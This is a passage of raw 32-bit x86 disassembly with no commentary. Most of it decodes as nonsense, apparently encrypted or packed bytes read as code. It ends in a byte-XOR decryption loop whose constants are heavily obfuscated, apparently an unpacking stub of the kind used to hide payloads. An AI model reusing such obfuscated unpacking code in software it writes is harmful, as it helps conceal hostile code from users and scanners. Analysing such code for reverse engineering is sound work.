  4282f5:	mov    cl,0xb5
  4282f7:	loope  0x4282c1
  4282f9:	mov    eax,0xcbb7bbd7
  4282fe:	cli    
  4282ff:	ffreep st(1)
  428301:	ret    0xd3db
  428304:	(bad)  
  428305:	idiv   BYTE PTR [ecx-0x112ff901]
  42830b:	jmp    0x60c60eb
  428310:	out    dx,al
  428311:	fidiv  WORD PTR [ecx-0xe0f2d3f]
  428317:	test   al,0xd2
  428319:	rcr    bl,1
  42831b:	repnz repz sar DWORD PTR [ebp+ebx*8-0x23074114],1
  428324:	mov    edi,0xe1dfe7da
  428329:	inc    al
  42832b:	jmp    0xaadd:0xf8ce01c4
  428332:	(bad)
  428336:	(bad)  
  428337:	shl    BYTE PTR [esi+ebp*4-0x52c0618],0xdd
  42833f:	cli    
  428340:	fdivp  st(5),st
  428342:	shr    ch,cl
  428344:	repz xlat BYTE PTR ds:[ebx]
  428346:	fadd   st(3),st
  428348:	retf   0xbda
  42834b:	add    cl,dh
  42834d:	push   cs
  42834e:	(bad)  
  42834f:	jmp    FWORD PTR [edi-0x95b4330]
  428355:	sti    
  428356:	rcl    ah,cl
  428358:	retf   0xc4f3
  42835b:	cli    
  42835c:	sti    
  42835d:	(bad)  
  42835e:	call   0xf2fd3d56
  428363:	(bad)  
  428364:	fsubr  st,st(3)
  428366:	in     eax,0x9
  428368:	cld    
  428369:	neg    ah
  42836b:	retf   
  42836c:	(bad)  
  42836e:	ror    DWORD PTR [ebx],0xdd
  428371:	enter  0xdef0,0xc5
  428375:	test   cl,0xb6
  428378:	mov    dl,0xb7
  42837a:	mov    al,0xba
  42837c:	test   dh,0xdd
  42837f:	aad    0xc8
  428381:	pop    es
  428382:	rol    BYTE PTR [ebx],1
  428384:	fdivrp st(5),st
  428386:	mov    esp,0xe401c7e4
  42838b:	or     ecx,DWORD PTR [eax]
  42838d:	adc    eax,DWORD PTR ds:0xe8efe305
  428393:	jmp    0xb5e0:0xf3b3f6ea
  42839a:	int3   
  42839b:	enter  0xcbba,0xfb
  42839f:	mov    ebx,0xdddffffe
  4283a4:	hlt    
  4283a5:	out    0xc5,al
  4283a7:	(bad)  
  4283a8:	add    al,0xfd
  4283aa:	or     ch,dl
  4283ac:	call   0xe8496f73
  4283b1:	mov    al,0xad
  4283b3:	loop   0x428367
  4283b5:	jmp    0x428368
  4283b7:	aam    0xe4
  4283b9:	jmp    0xbfd9:0xdbd5c9cf
  4283c0:	ror    edi,1
  4283c2:	shl    edx,cl
  4283c4:	rcr    bl,0xeb
  4283c7:	ror    BYTE PTR [edx],1
  4283c9:	jmp    0x413:0xce040ed8
  4283d0:	ror    ah,1
  4283d2:	rol    ah,0xbc
  4283d5:	cmc    
  4283d6:	aam    0xe0
  4283d8:	scas   eax,DWORD PTR es:[edi]
  4283d9:	int    0xed
  4283db:	hlt    
  4283dc:	fdivrp st(3),st
  4283de:	repnz not dh
  4283e1:	into   
  4283e2:	ret    0xf3bd
  4283e5:	add    bh,al
  4283e7:	icebp  
  4283e8:	in     al,0xc5
  4283ea:	out    0x8,al
  4283ec:	(bad)  
  4283ee:	adc    ch,dl
  4283f0:	retf   
  4283f1:	iret   
  4283f2:	shr    eax,1
  4283f4:	loopne 0x4283a0
  4283f6:	into   
  4283f7:	hlt    
  4283f8:	mov    ch,0xd9
  4283fa:	(bad)  
  4283fc:	mov    ebp,0xfad7dbb4
  428401:	int3   
  428402:	int3   
  428403:	lock faddp st(3),st
  428406:	pop    es
  428407:	(bad)  
  428408:	(bad)  
  42840a:	add    ecx,edi
  42840c:	add    esi,ebx
  42840e:	cld    
  42840f:	or     al,al
  428411:	loope  0x428405
  428413:	scas   al,BYTE PTR es:[edi]
  428414:	loopne 0x4283c7
  428416:	hlt    
  428417:	(bad)  
  428419:	mov    ecx,0xffbbd8e8
  42841e:	mov    ah,0xb9
  428420:	mov    eax,0x1e7f3e0
  428425:	(bad)  
  428426:	std    
  428427:	pop    es
  428428:	add    ecx,ebx
  42842a:	iret   
  42842b:	fstp   st(5)
  42842d:	sti    
  42842e:	push   es
  42842f:	les    edi,FWORD PTR [esi-0x430c2c11]
  428435:	(bad)  
  428436:	lods   al,BYTE PTR ds:[esi]
  428437:	out    0xc9,eax
  428439:	repz jmp 0xf6345535
  42843f:	add    al,BYTE PTR [edx]
  428441:	fdivrp st(5),st
  428443:	jecxz  0x428421
  428445:	fsqrt  
  428447:	loop   0x428446
  428449:	xlat   BYTE PTR ds:[ebx]
  42844a:	(bad)  
  42844b:	(bad)  
  42844d:	add    DWORD PTR [esi],ecx
  42844f:	les    ebp,FWORD PTR [ebx-0x192e1828]
  428455:	jmp    0x428438
  428457:	mov    edx,0xf9d1f0b2
  42845c:	mov    edi,0xf7d4f9b4
  428461:	dec    esi
  428463:	xlat   BYTE PTR ds:[ebx]
  428464:	(bad)  
  428465:	fdivr  QWORD PTR [ecx+0x2ddfafd]
  42846b:	or     eax,0xd2eadaf9
  428470:	fsubr  st,st(3)
  428472:	(bad)  
  428474:	out    dx,eax
  428475:	repz out 0xb1,eax
  428478:	stc    
  428479:	(bad)  
  42847a:	mov    ebx,0xfbcefbc4
  42847f:	aam    0xd7
  428481:	loope  0x428438
  428483:	pop    es
  428484:	mov    bh,0xf9
  428487:	ret    0xcb06
  42848a:	(bad)  
  42848b:	dec    BYTE PTR ds:0xedfce4e9
  428491:	ret    0xadee
  428494:	lods   al,BYTE PTR ds:[esi]
  428495:	mov    cl,0xe6
  428497:	enter  0xf3db,0xad
  42849b:	(bad)
  42849e:	cld    
  42849f:	aad    0xd2
  4284a1:	add    edi,ebx
  4284a3:	clc    
  4284a4:	cmc    
  4284a5:	lock ret 
  4284a7:	fxch   st(3)
  4284a9:	fcmovnu st,st(2)
  4284ab:	loope  0x428472
  4284ad:	enter  0xe9df,0xdf
  4284b1:	mov    esi,0xf6c1e2df
  4284b6:	mov    bh,0xbb
  4284b8:	rcl    bl,1
  4284ba:	test   bh,0xff
  4284bd:	mov    dh,0xe3
  4284bf:	mov    eax,0xbecf00d4
  4284c4:	loope  0x4284c8
  4284c6:	lock repnz or esp,esp
  4284ca:	fmul   DWORD PTR [edi]
  4284cc:	or     ecx,DWORD PTR [ebx]
  4284ce:	fsub   st(3),st
  4284d0:	scas   eax,DWORD PTR es:[edi]
  4284d1:	iret   
  4284d2:	shl    ebx,1
  4284d4:	aam    0xd2
  4284d6:	ret    
  4284d7:	jmp    0xbf37408d
  4284dc:	jmp    0x4284a2
  4284de:	fistp  QWORD PTR [edx-0x12231327]
  4284e4:	ret    0xc1d0
  4284e7:	clc    
  4284e8:	dec    BYTE PTR [ecx]
  4284ea:	leave  
  4284eb:	(bad)  
  4284ec:	clc    
  4284ed:	in     al,dx
  4284ee:	bswap  ebp
  4284f0:	fsub   st(1),st
  4284f2:	fsub   st(2),st
  4284f4:	in     al,dx
  4284f5:	rol    eax,0xee
  4284f8:	rol    al,cl
  4284fa:	hlt    
  4284fb:	(bad)  
  4284fc:	fstp   TBYTE PTR [eax-0x1e36242a]
  428502:	fcmovb st,st(3)
  428504:	(bad)
  428507:	clc    
  428508:	(bad)  
  428509:	cld    
  42850a:	fcmovnu st,st(7)
  42850c:	fucomi st,st(2)
  42850e:	in     al,dx
  42850f:	add    DWORD PTR [ebx-0x490f5a3d],esi
  428515:	into   
  428516:	loope  0x4284dc
  428518:	mov    ebx,0xced3dfd4
  42851d:	into   
  42851e:	imul   dh
  428520:	shl    al,cl
  428522:	mov    ecx,0xdafbc2d6
  428527:	fild   DWORD PTR ds:0x1ede404
  42852d:	out    dx,eax
  42852e:	(bad)  
  428530:	scas   eax,DWORD PTR es:[edi]
  428531:	(bad)  
  428532:	mov    bh,0xac
  428534:	jmp    0x428519
  428536:	retf   
  428537:	retf   
  428538:	in     eax,0xb8
  42853a:	sti    
  42853b:	call   0xee006f3d
  428540:	fscale 
  428542:	fcmovne st,st(4)
  428544:	loopne 0x428527
  428546:	mov    esp,0xddc5f4fe
  42854b:	add    edi,ecx
  42854d:	fcom   QWORD PTR [ebx]
  42854f:	fcmove st,st(7)
  428551:	out    0xe0,al
  428553:	shl    BYTE PTR [eax-0x351b0a36],1
  428559:	mov    al,0xe9
  42855b:	sti    
  42855c:	mov    ecx,0x1cfccb9
  428561:	inc    edi
  428563:	rol    BYTE PTR ds:0xf100e5de,cl
  428569:	out    0xfe,al
  42856b:	idiv   ah
  42856d:	in     al,dx
  42856e:	push   es
  42856f:	in     al,0xe6
  428571:	mov    bl,0xd1
  428573:	fucomp st(0)
  428575:	out    dx,eax
  428576:	fcmovnbe st,st(1)
  428578:	(bad)  
  428579:	rcl    ah,cl
  42857b:	std    
  42857c:	inc    BYTE PTR [ebx]
  42857e:	repz add ch,cl
  428581:	out    dx,eax
  428582:	in     al,dx
  428583:	clc    
  428584:	in     al,dx
  428585:	in     al,dx
  428586:	hlt    
  428587:	ret    
  428588:	fadd   QWORD PTR [ecx]
  42858a:	add    ah,al
  42858c:	int    0xe8
  42858e:	clc    
  42858f:	add    ebx,ecx
  428591:	icebp  
  428592:	out    dx,eax
  428593:	aad    0xc2
  428595:	lods   al,BYTE PTR ds:[esi]
  428596:	out    dx,eax
  428597:	mov    al,0xcb
  428599:	out    0xf1,al
  42859b:	ror    esi,1
  42859d:	lock jmp 0xb6115382
  4285a3:	cld    
  4285a4:	cld    
  4285a5:	loop   0x42859d
  4285a7:	add    edx,ebp
  4285a9:	ret    0xe104
  4285ac:	iret   
  4285ad:	or     al,BYTE PTR [edi]
  4285af:	add    ah,cl
  4285b1:	scas   al,BYTE PTR es:[edi]
  4285b2:	ror    esp,1
  4285b4:	rol    ebx,1
  4285b6:	jmp    0x4285af
  4285b8:	mov    ah,0xee
  4285ba:	enter  0xdcb9,0xdf
  4285be:	mov    ebp,0xf503f2f2
  4285c3:	(bad)  
  4285c5:	in     al,dx
  4285c6:	(bad)  
  4285c8:	or     ah,al
  4285ca:	out    dx,al
  4285cb:	or     ebp,esp
  4285cd:	retf   0xdf12
  4285d0:	stos   BYTE PTR es:[edi],al
  4285d1:	fsub   st(0),st
  4285d3:	jmp    0xc0b4:0xa8d0c5cf
  4285da:	shl    BYTE PTR [esi-0x1d3c4511],1
  4285e0:	cld    
  4285e1:	mov    edx,0xf2f4f3d3
  4285e6:	mov    ebp,0xc4d4e805
  4285eb:	fxch   st(1)
  4285ed:	or     bh,dh
  4285ef:	stc    
  4285f0:	into   
  4285f1:	mov    eax,0xc7efe4c3
  4285f6:	int    0xf3
  4285f8:	icebp  
  4285f9:	shr    esi,cl
  4285fb:	std    
  4285fc:	jmp    0xc7ec:0xe0eebcf1
  428603:	mov    esi,0xf2eae3f1
  428608:	(bad)  
  42860a:	enter  0xe9cf,0xb
  42860e:	fsub   st(2),st
  428610:	mov    dl,0xc9
  428612:	rep lods al,BYTE PTR ds:[esi]
  428614:	in     eax,0xe5
  428616:	mov    dh,0xe9
  428618:	repnz (bad) 
  42861a:	fdivr  DWORD PTR [esi-0x473c022c]
  428620:	shr    dh,cl
  428622:	out    0xc0,al
  428624:	add    al,BYTE PTR [edx]
  428626:	icebp  
  428627:	or     eax,ecx
  428629:	jmp    0xca07:0xe7e5d8e8
  428630:	loop   0x4285f0
  428632:	out    dx,al
  428633:	(bad)  
  428635:	(bad)  
  428637:	repz mov bh,0xb9
  42863a:	mov    ebx,0xc9d3bde5
  42863f:	test   DWORD PTR [ecx],0xd9eee7d6
  428645:	in     eax,0xf1
  428647:	(bad)  
  428649:	or     dh,ah
  42864b:	fdiv   st,st(4)
  42864d:	fild   WORD PTR ds:0xe3eaca09
  428653:	imul   al
  428655:	repnz (bad) 
  428657:	(bad)  
  428658:	aad    0xf0
  42865a:	cli    
  42865b:	(bad)  
  42865c:	std    
  42865d:	retf   0xfdd2
  428660:	fpatan 
  428662:	repz cli 
  428664:	icebp  
  428665:	mov    ebp,0xfa07ca06
  42866a:	out    dx,eax
  42866b:	fimul  DWORD PTR [eax]
  42866d:	fsubrp st(7),st
  42866f:	loope  0x428662
  428671:	fsub   st,st(2)
  428673:	mul    ebp
  428675:	cmc    
  428676:	mov    dh,0xb2
  428678:	jmp    0xf80c4e2b
  42867d:	cli    
  42867e:	retf   0xdaf3
  428681:	fistp  QWORD PTR [ebp-0x1c2c284c]
  428687:	(bad)  
  428688:	(bad)  
  428689:	jmp    0x13cc:0xdcde060f
  428690:	out    dx,eax
  428691:	lods   al,BYTE PTR ds:[esi]
  428692:	in     al,0xac
  428694:	shl    eax,1
  428696:	in     al,0xf4
  428698:	fcmovnb st,st(7)
  42869a:	lds    esi,FWORD PTR [ebp+edi*8-0x29244302]
  4286a1:	jecxz  0x428661
  4286a3:	(bad)  
  4286a4:	(bad)  
  4286a5:	fld    DWORD PTR [ecx]
  4286a7:	(bad)  
  4286a9:	(bad)  
  4286ab:	leave  
  4286ac:	retf   
  4286ad:	cld    
  4286ae:	in     eax,0xeb
  4286b0:	test   al,0xce
  4286b2:	lock mov bl,0xe4
  4286b5:	(bad)  
  4286b6:	lods   al,BYTE PTR ds:[esi]
  4286b7:	cli    
  4286b8:	(bad)  
  4286b9:	mov    ebx,0xe8fcf1d4
  4286be:	mov    ch,0xde
  4286c0:	cli    
  4286c1:	ret    0xbfc7
  4286c4:	ffreep st(1)
  4286c6:	or     edx,edi
  4286c8:	jecxz  0x4286a5
  4286ca:	out    0xdc,al
  4286cc:	cmc    
  4286cd:	repz adc ah,bh
  4286d0:	mov    esp,0xace1ceee
  4286d5:	in     eax,dx
  4286d6:	int3   
  4286d7:	(bad)  
  4286d9:	repnz aam 0xb8
  4286dc:	aad    0xd0
  4286de:	mov    cl,0xbc
  4286e0:	sti    
  4286e1:	enter  0xc3d4,0xda
  4286e5:	shr    ebx,1
  4286e7:	mul    ebp
  4286e9:	cli    
  4286ea:	out    0xf8,eax
  4286ec:	out    0xfb,al
  4286ee:	sti    
  4286ef:	icebp  
  4286f0:	fucomip st,st(5)
  4286f2:	enter  0xe4eb,0xc6
  4286f6:	shr    ecx,0xec
  4286f9:	repnz fucomip st,st(3)
  4286fc:	mov    ecx,0xc1febfed
  428701:	rol    DWORD PTR [edx],1
  428703:	out    0xda,al
  428705:	jmp    0x4286fc
  428707:	jmp    0xed4d5cec
  42870c:	pextrw esp,mm2,0xb
  428710:	fld    st(7)
  428712:	loop   0x4286ca
  428714:	aam    0xf5
  428716:	cmc    
  428717:	out    0xe0,eax
  428719:	out    dx,al
  42871a:	mov    edi,0xd9fbfde6
  42871f:	cli    
  428720:	shr    edi,0xf6
  428723:	add    eax,0xc1e7f1fe
  428728:	ror    BYTE PTR [ebx],0xda
  42872b:	retf   0x1c9
  42872e:	(bad)  
  428730:	out    dx,al
  428731:	mov    esp,0xe1e0b3c7
  428736:	enter  0xb5ac,0xe6
  42873a:	aam    0xd2
  42873c:	cli    
  42873d:	hlt    
  42873e:	mov    ebx,0xece3facd
  428743:	icebp  
  428744:	mov    esi,0x209d3e3
  428749:	retf   
  42874a:	fld1   
  42874c:	or     BYTE PTR [edx],al
  42874e:	pavgw  mm5,mm0
  428751:	in     al,dx
  428752:	int    0xed
  428754:	in     eax,dx
  428755:	lock (bad) 
  428757:	aad    0xe6
  428759:	repnz shl DWORD PTR [esi-0x92a402e],1
  428760:	std    
  428761:	(bad)  
  428763:	sar    dh,1
  428765:	rcl    dl,cl
  428767:	ret    
  428768:	ret    
  428769:	sti    
  42876a:	jecxz  0x42872c
  42876c:	clc    
  42876d:	push   es
  42876e:	pop    es
  42876f:	out    0xeb,al
  428771:	mov    al,0xed
  428773:	int    0xc6
  428775:	mov    esp,0xdbd9ecd6
  42877a:	mov    ah,0xba
  42877c:	clc    
  42877d:	retf   
  42877e:	loop   0x428778
  428780:	mov    esi,0xd5ecf1f7
  428785:	fcom   st(0)
  428787:	fiadd  DWORD PTR ds:0xfbe0fddf
  42878d:	cld    
  42878e:	fstp   st(6)
  428790:	(bad)  
  428792:	jecxz  0x42875b
  428794:	shr    esp,cl
  428796:	(bad)  
  428797:	shl    dl,1
  428799:	(bad)  
  42879a:	mov    eax,0xd903d0be
  42879f:	iret   
  4287a0:	mov    ebp,0xc2f6f0ee
  4287a5:	sar    BYTE PTR [ebp-0x20062b2a],0xc7
  4287ac:	cli    
  4287ad:	(bad)  
  4287ae:	(bad)  
  4287b0:	ret    0xc3c4
  4287b3:	imul   BYTE PTR [ecx+ecx*8-0x2b1e1230]
  4287ba:	imul   edx
  4287bc:	int3   
  4287bd:	mov    ah,0xfe
  4287bf:	retf   0xf7db
  4287c2:	mov    eax,0xd3fa06bf
  4287c7:	jmp    0x13e5:0x70706c4
  4287ce:	push   cs
  4287cf:	call   eax
  4287d1:	lods   al,BYTE PTR ds:[esi]
  4287d2:	repz retf 
  4287d4:	in     eax,dx
  4287d5:	shl    DWORD PTR [esi-0x9473a1e],cl
  4287db:	lods   al,BYTE PTR ds:[esi]
  4287dc:	xlat   BYTE PTR ds:[ebx]
  4287dd:	(bad)  
  4287de:	mov    ebx,0xc3b6c8e3
  4287e3:	in     al,dx
  4287e4:	add    eax,0xf0e9f1c3
  4287e9:	std    
  4287ea:	call   0xdf0d8df6
  4287ef:	fcomp  st(5)
  4287f1:	fdivrp st(0),st
  4287f3:	jecxz  0x4287d8
  4287f5:	in     al,0xc6
  4287f7:	not    bl
  4287f9:	in     eax,0xd2
  4287fb:	out    dx,eax
  4287fc:	lds    edi,FWORD PTR [esi+edi*8-0x30f0112]
  428803:	add    ebx,esp
  428805:	std    
  428806:	fdivr  st,st(5)
  428808:	in     al,0xe8
  42880a:	(bad)
  42880d:	jecxz  0x42880d
  42880f:	jecxz  0x4287ca
  428811:	call   0xb31a3ed2
  428816:	in     al,dx
  428817:	rol    ebp,0xb7
  42881a:	hlt    
  42881b:	mov    al,0xc8
  42881d:	mov    edx,0xdeddecff
  428822:	not    ebx
  428824:	add    bh,bl
  428826:	(bad)  
  428827:	sti    
  428828:	in     al,0xd5
  42882a:	aad    0xfd
  42882c:	enter  0xc,0x5
  428830:	ror    bl,1
  428832:	loope  0x42881c
  428834:	rcl    edi,cl
  428836:	test   eax,0xc5d6d5bb
  42883b:	neg    edi
  42883d:	iret   
  42883e:	retf   0xeecf
  428841:	cmc    
  428842:	(bad)  
  428844:	loop   0x428806
  428846:	jmp    0xdde5:0xe2dbe5de
  42884d:	jmp    0xe5f2:0xecdfdcf2
  428854:	int3   
  428855:	sti    
  428856:	cli    
  428857:	stc    
  428858:	retf   0xbbe8
  42885b:	mov    edi,0xd5c9d1be
  428860:	into   
  428861:	cld    
  428862:	mov    ecx,0xf705bedb
  428867:	mov    BYTE PTR ds:0xc4e9f906,0x0
  42886e:	fsubr  st,st(2)
  428870:	mov    esi,0xccbed6eb
  428875:	into   
  428876:	mov    bh,0xd1
  428878:	div    edx
  42887a:	mov    cl,0xd8
  42887c:	cmc    
  42887d:	in     al,0xcd
  42887f:	ret    
  428880:	add    ah,cl
  428882:	mov    ebp,0xfbd500c2
  428887:	sar    dl,cl
  428889:	lock fnclex 
  42888c:	in     al,dx
  42888d:	leave  
  42888e:	std    
  42888f:	retf   
  428890:	retf   0xdfcc
  428893:	mov    ebp,0xeac9cec0
  428898:	enter  0xdacf,0xfd
  42889c:	lock mov esi,0xf1dce2f7
  4288a2:	(bad)  
  4288a3:	aam    0x5
  4288a5:	fiadd  DWORD PTR ds:0xdfd4e3c1
  4288ab:	in     eax,0xe1
  4288ad:	(bad)  
  4288ae:	fneni(8087 only) 
  4288b0:	lock jmp 0xb6d6:0xaad2afe6
  4288b8:	jmp    0xf6d3:0xdff1f2e0
  4288bf:	imul   esp
  4288c1:	ret    
  4288c2:	fcomip st,st(6)
  4288c4:	ret    
  4288c5:	aad    0xf2
  4288c7:	(bad)  
  4288c8:	cli    
  4288c9:	out    dx,eax
  4288ca:	fmul   DWORD PTR [ecx]
  4288cc:	(bad)  
  4288cd:	loope  0x4288a8
  4288cf:	loop   0x4288a0
  4288d1:	into   
  4288d2:	mov    edi,0xf7c9c6e6
  4288d7:	into   
  4288d8:	fxch   st(4)
  4288da:	cli    
  4288db:	in     al,0xfb
  4288dd:	jmp    0xf0:0xd0d201cb
  4288e4:	idiv   DWORD PTR [ebp+edi*4-0x10003b1c]
  4288eb:	enter  0xdddb,0xf9
  4288ef:	repz mov eax,0xccead0d1
  4288f5:	out    dx,al
  4288f6:	in     eax,dx
  4288f7:	div    DWORD PTR [edi+ebp*8-0x220d0b2d]
  4288fe:	not    bl
  428900:	sar    DWORD PTR [ecx-0x4108faff],1
  428906:	add    BYTE PTR [esi],al
  428908:	icebp  
  428909:	idiv   ch
  42890b:	add    ecx,eax
  42890d:	in     eax,dx
  42890e:	(bad)  
  428910:	jmp    0xbd0466e6
  428915:	rol    ebx,1
  428917:	mul    eax
  428919:	mov    ah,0xb0
  42891b:	mov    bh,0xf4
  42891d:	out    dx,eax
  42891e:	xlat   BYTE PTR ds:[ebx]
  42891f:	shl    al,cl
  428921:	mov    ecx,0xfbc5bfe1
  428926:	or     ebp,edx
  428928:	retf   
  428929:	stc    
  42892a:	(bad)  
  42892b:	mov    esp,0xc9e6c4e0
  428930:	loop   0x428915
  428932:	iret   
  428933:	fstp   st(5)
  428935:	mov    ch,0xd7
  428937:	int3   
  428938:	(bad)  
  428939:	stc    
  42893a:	enter  0xc4b6,0xcf
  42893e:	stc    
  42893f:	mov    al,0xf7
  428941:	add    esi,eax
  428943:	mov    eax,0xc7dcd7db
  428948:	in     eax,0xff
  42894a:	aam    0x9
  42894c:	add    al,bh
  42894e:	out    0xc8,eax
  428950:	scas   eax,DWORD PTR es:[edi]
  428951:	scas   eax,DWORD PTR es:[edi]
  428952:	jmp    0xd2f0:0xe8c2d7d7
  428959:	call   0x4196734
  42895e:	retf   
  42895f:	fdiv   st(5),st
  428961:	enter  0xcdf5,0xd4
  428965:	cld    
  428966:	cli    
  428967:	or     dh,bh
  428969:	or     bl,dh
  42896b:	in     eax,dx
  42896c:	pop    es
  42896d:	out    0x8,eax
  42896f:	add    al,0xd1
  428971:	rcl    eax,1
  428973:	scas   eax,DWORD PTR es:[edi]
  428974:	ffree  st(6)
  428976:	in     al,0xf7
  428978:	mov    ah,0xc8
  42897a:	mov    dh,0xf6
  42897c:	fsubr  st,st(3)
  42897e:	std    
  42897f:	mov    ebx,0xfff2f2bc
  428984:	mov    edi,0xe6c3eade
  428989:	(bad)
  42898c:	hlt    
  42898d:	add    esi,edi
  42898f:	fsubp  st(6),st
  428991:	iret   
  428992:	jmp    0xe8fa:0xecdbb1cf
  428999:	enter  0xedc5,0xbb
  42899d:	aam    0xdc
  42899f:	icebp  
  4289a0:	add    eax,esi
  4289a2:	repnz sar bl,1
  4289a5:	push   ebp
  4289a7:	ret    
  4289a8:	ret    0xbf6
  4289ab:	imul   ah
  4289ad:	push   cs
  4289ae:	or     DWORD PTR [edx],eax
  4289b0:	mov    cl,0xea
  4289b2:	out    0xb1,eax
  4289b4:	loop   0x4289ac
  4289b6:	jmp    0x42898b
  4289b8:	call   0xf00c568c
  4289bd:	in     al,dx
  4289be:	inc    DWORD PTR [ecx]
  4289c0:	leave  
  4289c1:	sar    dl,1
  4289c3:	add    ebx,eax
  4289c5:	inc    DWORD PTR [ecx]
  4289c7:	repnz (bad) 
  4289c9:	out    dx,eax
  4289ca:	aad    0xdb
  4289cc:	fcmovne st,st(1)
  4289ce:	in     eax,0xca
  4289d0:	ret    
  4289d1:	jecxz  0x4289bd
  4289d3:	scas   eax,DWORD PTR es:[edi]
  4289d4:	mov    bl,0xf6
  4289d6:	jmp    0xccf93ad1
  4289db:	les    esi,FWORD PTR [ecx+ebp*8-0x310b0509]
  4289e2:	int    0xe0
  4289e4:	cmc    
  4289e5:	std    
  4289e6:	sti    
  4289e7:	(bad)  
  4289e8:	(bad)  
  4289ea:	cmc    
  4289eb:	std    
  4289ec:	loop   0x4289d7
  4289ee:	cld    
  4289ef:	stc    
  4289f0:	(bad)  
  4289f1:	(bad)  
  4289f2:	call   0xc60766cd
  4289f7:	jmp    0xd2d7:0xc4cfd9b7
  4289fe:	fsubrp st(1),st
  428a00:	sar    DWORD PTR [edx-0x1ff82f0a],0x0
  428a07:	in     al,0xf4
  428a09:	aad    0xe8
  428a0b:	add    ebx,ebp
  428a0d:	out    0xc1,eax
  428a0f:	or     bl,dh
  428a11:	repnz test eax,0xe6b4c9bd
  428a17:	loopne 0x4289cf
  428a19:	xlat   BYTE PTR ds:[ebx]
  428a1a:	div    DWORD PTR [esp+edi*8-0xb1efc1d]
  428a21:	clc    
  428a22:	out    0xd8,eax
  428a24:	push   es
  428a25:	std    
  428a26:	ret    0xf6f4
  428a29:	cmc    
  428a2a:	(bad)  
  428a2d:	add    al,0xca
  428a2f:	out    dx,eax
  428a30:	les    ecx,FWORD PTR [ecx-0x1637b]
  428a36:	dec    DWORD PTR [ebp-0x1777b]
  428a3c:	dec    DWORD PTR [ecx-0x17f7b]
  428a42:	dec    DWORD PTR [ebp-0x15f7b]
  428a48:	dec    DWORD PTR [ecx-0x1737b]
  428a4e:	dec    DWORD PTR [ebx-0x1937b]
  428a54:	(bad)  
  428a55:	cmp    eax,DWORD PTR [ebp-0x164]
  428a5b:	jae    0x428c0b
  428a61:	mov    eax,DWORD PTR [ebp-0x180]
  428a67:	mov    DWORD PTR [eax],0xf89c85a5
  428a6d:	mov    eax,DWORD PTR [ebp-0x174]
  428a73:	mov    DWORD PTR [eax],0xf89c85ae
  428a79:	lea    eax,[ebp-0x185]
  428a7f:	mov    DWORD PTR [ebp-0x18c],eax
  428a85:	mov    eax,DWORD PTR [ebp-0x168]
  428a8b:	xor    eax,0x75108b5
  428a90:	add    eax,0x3272fb
  428a95:	mov    ecx,DWORD PTR [ebp-0x164]
  428a9b:	imul   ecx,eax
  428a9e:	mov    eax,DWORD PTR [ebp-0x18c]
  428aa4:	mov    edx,DWORD PTR [ebp-0x190]
  428aaa:	mov    cl,BYTE PTR [edx+ecx*1]
  428aad:	mov    BYTE PTR [eax],cl
  428aaf:	mov    eax,DWORD PTR [ebp-0x168]
  428ab5:	xor    eax,0x75108b5
  428aba:	add    eax,0x3272fb
  428abf:	mov    ecx,DWORD PTR [ebp-0x164]
  428ac5:	imul   ecx,eax
  428ac8:	mov    eax,DWORD PTR [ebp-0x170]
  428ace:	xor    eax,0x75108b5
  428ad3:	add    eax,DWORD PTR [ebp-0x190]
  428ad9:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fb]
  428ae1:	mov    ecx,DWORD PTR [ebp-0x178]
  428ae7:	xor    ecx,0x75108b5
  428aed:	lea    eax,[eax+ecx*1+0x3272fb]
  428af4:	movzx  ecx,BYTE PTR [ebp-0x185]
  428afb:	xor    ecx,eax
  428afd:	mov    BYTE PTR [ebp-0x185],cl
  428b03:	mov    al,BYTE PTR [ebp-0x185]
  428b09:	mov    ecx,DWORD PTR [ebp-0x168]
  428b0f:	xor    ecx,0x75108b5
  428b15:	add    ecx,0x3272fb
  428b1b:	mov    edx,DWORD PTR [ebp-0x164]
  428b21:	imul   edx,ecx
  428b24:	mov    ecx,DWORD PTR [ebp-0x190]
  428b2a:	mov    BYTE PTR [ecx+edx*1],al
  428b2d:	mov    eax,DWORD PTR [ebp-0x168]
  428b33:	xor    eax,0x75108b5
  428b38:	add    eax,0x3272fb
  428b3d:	mov    ecx,DWORD PTR [ebp-0x164]
  428b43:	imul   ecx,eax
  428b46:	mov    eax,DWORD PTR [ebp-0x18c]
  428b4c:	mov    edx,DWORD PTR [ebp-0x190]
  428b52:	mov    cl,BYTE PTR [edx+ecx*1]
  428b55:	mov    BYTE PTR [eax],cl
  428b57:	mov    eax,DWORD PTR [ebp-0x168]
  428b5d:	xor    eax,0x75108b5
  428b62:	add    eax,0x3272fb
  428b67:	mov    ecx,DWORD PTR [ebp-0x164]
  428b6d:	imul   ecx,eax
  428b70:	mov    eax,DWORD PTR [ebp-0x184]
  428b76:	xor    eax,0x75108b5
  428b7b:	add    eax,DWORD PTR [ebp-0x190]
  428b81:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fb]
  428b89:	mov    ecx,DWORD PTR [ebp-0x160]
  428b8f:	xor    ecx,0x75108b5
  428b95:	lea    eax,[eax+ecx*1+0x3272fb]
  428b9c:	movzx  ecx,BYTE PTR [ebp-0x185]
  428ba3:	xor    ecx,eax
  428ba5:	mov    BYTE PTR [ebp-0x185],cl
  428bab:	mov    al,BYTE PTR [ebp-0x185]
  428bb1:	mov    ecx,DWORD PTR [ebp-0x168]
  428bb7:	xor    ecx,0x75108b5
  428bbd:	add    ecx,0x3272fb
  428bc3:	mov    edx,DWORD PTR [ebp-0x164]
  428bc9:	imul   edx,ecx
  428bcc:	mov    ecx,DWORD PTR [ebp-0x190]
  428bd2:	mov    BYTE PTR [ecx+edx*1],al
  428bd5:	mov    eax,DWORD PTR [ebp-0x184]
  428bdb:	xor    eax,0x75108b5
  428be0:	add    eax,0x3272fb
  428be5:	mov    ecx,DWORD PTR [ebp-0x16c]
  428beb:	xor    ecx,0x75108b5
  428bf1:	add    ecx,0x3272fb
  428bf7:	imul   eax,ecx
  428bfa:	add    eax,DWORD PTR [ebp-0x164]
  428c00:	mov    DWORD PTR [ebp-0x164],eax
  428c06:	jmp    0x428a4f
  428c0b:	mov    eax,DWORD PTR [ebp-0x154]
  428c11:	xor    eax,0x75108b5
  428c16:	mov    ecx,DWORD PTR [ebp-0x17c]
  428c1c:	xor    ecx,0x75108b5
  428c22:	add    ecx,0x3272fb
  428c28:	mov    edx,DWORD PTR [ebp-0x194]
  428c2e:	mov    esi,DWORD PTR [ebp-0x184]
  428c34:	xor    esi,0x75108b5
  428c3a:	add    esi,0x3272fb
  428c40:	imul   esi,edx
  428c43:	or     esi,ecx
